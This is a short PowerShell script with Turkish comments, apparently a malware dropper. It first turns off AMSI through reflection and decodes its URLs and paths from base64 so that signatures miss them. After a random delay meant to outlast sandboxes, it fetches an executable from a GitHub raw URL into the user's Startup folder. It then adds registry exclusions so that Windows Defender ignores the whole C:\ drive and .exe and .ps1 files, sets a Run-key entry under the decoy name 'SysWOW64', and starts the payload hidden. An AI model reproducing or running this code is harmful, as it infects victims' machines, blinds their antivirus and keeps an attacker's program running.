# AMSI bypass (karakter kodu ile)
$w=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}
$x=$w.GetFields("NonPublic,Static")|?{$_.Name -like "*Context"}
$x.SetValue($null,[IntPtr]::Zero)

# Base64 cozucu
function B($s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}

# String'ler base64 (statik imza yok)
$U = B("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZsZXhidXNpbmVzczMxLWRlc2lnbi94L3JlZnMvaGVhZHMvbWFpbi9NaWNyb3N5cy5leGU=")
$H = B("QzpcVXNlcnNc") + $env:USERNAME + B("XEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcTWljcm9zeXMuZXhl")

# Rastgele gecikme (sandbox atlatma)
Start-Sleep -Seconds (Get-Random -Min 20 -Max 90)

# Indirme (WebClient yerine HttpWebRequest)
function D($u,$h){
    try{
        $r = [Net.HttpWebRequest]::Create($u)
        $r.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        $s = $r.GetResponse().GetResponseStream()
        $f = [IO.File]::Create($h)
        $s.CopyTo($f)
        $f.Close(); $s.Close()
        return $true
    }catch{return $false}
}

# Dislama (registry uzerinden, Add-MpPreference yok)
function E($p){
    $k = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    if(-not(Test-Path $k)){New-Item $k -Force -EA 0|Out-Null}
    New-ItemProperty $k -Name $p -Value 0 -PropertyType DWord -Force -EA 0|Out-Null
}
function E2($ext){
    $k = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions"
    if(-not(Test-Path $k)){New-Item $k -Force -EA 0|Out-Null}
    New-ItemProperty $k -Name $ext -Value 0 -PropertyType DWord -Force -EA 0|Out-Null
}

# Kalicilik (Run anahtari)
function R($x){
    $k = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $k -Name "SysWOW64" -Value $x -Force -EA 0
}

# Calistir
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
    E "C:\"; E2 ".exe"; E2 ".ps1"
    if(D $U $H){
        R $H
        Start-Process $H -WindowStyle Hidden -EA 0
    }
}